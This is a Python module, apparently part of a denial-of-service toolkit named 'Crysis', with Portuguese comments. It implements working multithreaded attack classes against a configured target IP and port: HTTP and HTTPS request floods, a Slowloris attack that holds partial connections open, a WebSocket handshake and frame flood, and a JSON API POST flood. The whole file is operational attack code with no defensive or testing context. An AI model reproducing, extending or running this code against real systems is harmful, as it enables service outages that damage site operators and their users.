"""
Ataques de Camada de Aplicação (HTTP, HTTPS, Slowloris, etc.)
"""
import socket
import ssl
import time
import random
import threading
from .base import BaseAttack
from ..core.config import AttackConfig

class HTTPFlood(BaseAttack):
    """HTTP Flood Attack"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando HTTP Flood...")
        
        def attack_thread(thread_id):
            packets_sent = 0
            start_time = time.time()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                        sock.settimeout(5)
                        sock.connect((self.config.target_ip, self.config.target_port))
                        
                        # HTTP request simples
                        http_request = (
                            f"GET / HTTP/1.1\r\n"
                            f"Host: {self.config.target_ip}\r\n"
                            f"User-Agent: Crysis-HTTP-Flood\r\n"
                            f"Connection: close\r\n"
                            f"\r\n"
                        ).encode()
                        
                        sock.send(http_request)
                        packets_sent += 1
                        self._update_stats(len(http_request))
                        
                except Exception:
                    self._handle_error()
            
            print(f"🧵 Thread {thread_id} finalizada: {packets_sent} requisições HTTP")
        
        # Inicia múltiplas threads
        threads = []
        for i in range(self.config.threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Aguarda todas as threads terminarem ou timeout
        for thread in threads:
            thread.join(timeout=self.config.duration + 5)

class HTTPSFlood(BaseAttack):
    """HTTPS Flood Attack"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando HTTPS Flood...")
        
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        def attack_thread(thread_id):
            packets_sent = 0
            start_time = time.time()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                try:
                    with socket.create_connection(
                        (self.config.target_ip, self.config.target_port), timeout=5
                    ) as sock:
                        with context.wrap_socket(sock, server_hostname=self.config.target_ip) as ssock:
                            # HTTPS request simples
                            http_request = (
                                f"GET / HTTP/1.1\r\n"
                                f"Host: {self.config.target_ip}\r\n"
                                f"User-Agent: Crysis-HTTPS-Flood\r\n"
                                f"Connection: close\r\n"
                                f"\r\n"
                            ).encode()
                            
                            ssock.send(http_request)
                            packets_sent += 1
                            self._update_stats(len(http_request))
                            
                except Exception:
                    self._handle_error()
            
            print(f"🧵 Thread {thread_id} finalizada: {packets_sent} requisições HTTPS")
        
        # Inicia múltiplas threads
        threads = []
        for i in range(self.config.threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Aguarda todas as threads terminarem ou timeout
        for thread in threads:
            thread.join(timeout=self.config.duration + 5)

class SlowlorisAttack(BaseAttack):
    """Slowloris Attack - Conexões parciais HTTP"""
    
    def __init__(self, config: AttackConfig, stats_manager):
        super().__init__(config, stats_manager)
        self.sockets = []
        self.max_sockets = min(config.threads, 200)  # Número máximo de sockets abertos
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando Slowloris Attack...")
        
        try:
            # Fase 1: Abre conexões lentamente
            self._open_connections()
            
            # Fase 2: Mantém conexões abertas
            self._maintain_connections()
            
        except Exception as e:
            print(f"❌ Erro no Slowloris: {e}")
        finally:
            self._cleanup()
    
    def _open_connections(self):
        """Abre conexões HTTP parciais"""
        print("📡 Abrindo conexões Slowloris...")
        start_time = time.time()
        
        for i in range(self.max_sockets):
            if (self.stop_event.is_set() or 
                (time.time() - start_time) >= self.config.duration):
                break
                
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.config.target_ip, self.config.target_port))
                
                # Envia headers parcialmente
                headers = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {self.config.target_ip}\r\n"
                    f"User-Agent: Mozilla/5.0\r\n"
                    f"Content-Length: 42\r\n"
                ).encode()
                
                sock.send(headers)
                self.sockets.append(sock)
                self._update_stats(len(headers))
                
                # Pausa entre conexões
                time.sleep(0.1)
                
            except Exception:
                self._handle_error()
        
        print(f"✅ Criadas {len(self.sockets)} conexões Slowloris")
    
    def _maintain_connections(self):
        """Mantém conexões abertas enviando dados lentamente"""
        print("🔗 Mantendo conexões abertas...")
        start_time = time.time()
        
        while (not self.stop_event.is_set() and 
               self.sockets and 
               (time.time() - start_time) < self.config.duration):
            
            for sock in self.sockets[:]:  # Cópia para evitar modificação durante iteração
                if self.stop_event.is_set():
                    break
                    
                try:
                    # Envia header adicional muito lentamente
                    sock.send(b"X-a: b\r\n")
                    self._update_stats(8)
                    
                except (socket.error, BrokenPipeError, OSError):
                    # Remove socket defeituoso
                    self.sockets.remove(sock)
                    self._handle_error()
            
            # Pausa longa entre envios
            time.sleep(5)
    
    def _cleanup(self):
        """Fecha todas as conexões"""
        print("🧹 Limpando conexões Slowloris...")
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        self.sockets.clear()

class WebSocketFlood(BaseAttack):
    """WebSocket Flood Attack"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando WebSocket Flood...")
        
        def attack_thread(thread_id):
            packets_sent = 0
            start_time = time.time()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                        sock.settimeout(5)
                        sock.connect((self.config.target_ip, self.config.target_port))
                        
                        # Handshake WebSocket simples
                        ws_handshake = (
                            f"GET /chat HTTP/1.1\r\n"
                            f"Host: {self.config.target_ip}\r\n"
                            f"Upgrade: websocket\r\n"
                            f"Connection: Upgrade\r\n"
                            f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
                            f"Sec-WebSocket-Version: 13\r\n"
                            f"\r\n"
                        ).encode()
                        
                        sock.send(ws_handshake)
                        packets_sent += 1
                        self._update_stats(len(ws_handshake))
                        
                        # Tenta enviar alguns frames
                        frame_attempts = 0
                        while (not self.stop_event.is_set() and 
                               frame_attempts < 10 and 
                               (time.time() - start_time) < self.config.duration):
                            try:
                                # Frame WebSocket simples
                                frame = b'\x81\x05Hello'
                                sock.send(frame)
                                packets_sent += 1
                                self._update_stats(len(frame))
                                frame_attempts += 1
                                time.sleep(0.5)
                            except:
                                break
                        
                except Exception:
                    self._handle_error()
            
            print(f"🧵 Thread {thread_id} finalizada: {packets_sent} pacotes WebSocket")
        
        # Inicia múltiplas threads
        threads = []
        for i in range(self.config.threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Aguarda todas as threads terminarem ou timeout
        for thread in threads:
            thread.join(timeout=self.config.duration + 5)

class APIFlood(BaseAttack):
    """API JSON Flood Attack"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando API Flood...")
        
        def attack_thread(thread_id):
            packets_sent = 0
            start_time = time.time()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                        sock.settimeout(5)
                        sock.connect((self.config.target_ip, self.config.target_port))
                        
                        # API request JSON simples
                        api_request = (
                            f"POST /api/v1/data HTTP/1.1\r\n"
                            f"Host: {self.config.target_ip}\r\n"
                            f"Content-Type: application/json\r\n"
                            f"Content-Length: 45\r\n"
                            f"\r\n"
                            f'{{"action":"test","data":"attack_{thread_id}"}}'
                        ).encode()
                        
                        sock.send(api_request)
                        packets_sent += 1
                        self._update_stats(len(api_request))
                        
                except Exception:
                    self._handle_error()
            
            print(f"🧵 Thread {thread_id} finalizada: {packets_sent} requisições API")
        
        # Inicia múltiplas threads
        threads = []
        for i in range(self.config.threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Aguarda todas as threads terminarem ou timeout
        for thread in threads:
            thread.join(timeout=self.config.duration + 5)